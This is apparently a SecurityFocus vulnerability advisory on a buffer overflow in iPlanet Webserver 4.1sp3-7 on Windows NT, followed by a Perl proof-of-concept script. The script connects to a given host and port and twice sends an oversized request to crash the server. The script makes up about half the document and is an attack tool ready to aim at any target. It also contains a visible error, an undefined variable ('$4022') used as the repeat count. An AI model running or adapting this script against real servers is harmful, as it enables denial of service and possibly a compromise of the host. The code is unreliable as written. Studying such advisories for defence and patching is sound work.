source: http://www.securityfocus.com/bid/2732/info

iPlanet Webserver is an http server product offered by the Sun-Netscape Alliance.

By sending a specially crafted request (composed of at least 2000 characters) it is possible to cause a buffer overflow. This could cause the termination of the affected service, requiring a restart and enabling a remote attacker to effect a denial of service attack.

If the submitted buffer is properly structured, it may yield a remote system shell.

Successful exploitation of this vulnerability could lead to a complete compromise of the host.

Note that while only installations of iWS4.1sp3-7 on Windows NT are immediately vulnerable to this attack, all users of iWS4.1sp3-7 are advised to install the NSAPI. 

#!/usr/bin/perl
use IO::Socket;
  if (@ARGV < 2)  {
     print "Usage: host port\n";
     exit;
   }
$overflow = "A" x $4022;
&connect;
sleep(15);
&connect;
exit;
################################################
sub connect() {
  $sock= IO::Socket::INET->new(Proto=>"TCP",
			     PeerAddr=>$ARGV[0],
			     PeerPort=>"$ARGV[1]",)
			     or die "Cant connect to $ARGV[0]: $!\n";
  $sock->autoflush(1);
  print $sock "$overflow /index.html HTTP/1.0\n\n";
  $response=<$sock>;
  print "$response";
  while(<$sock>){
     print "$_\n";
  }
  close $sock;
}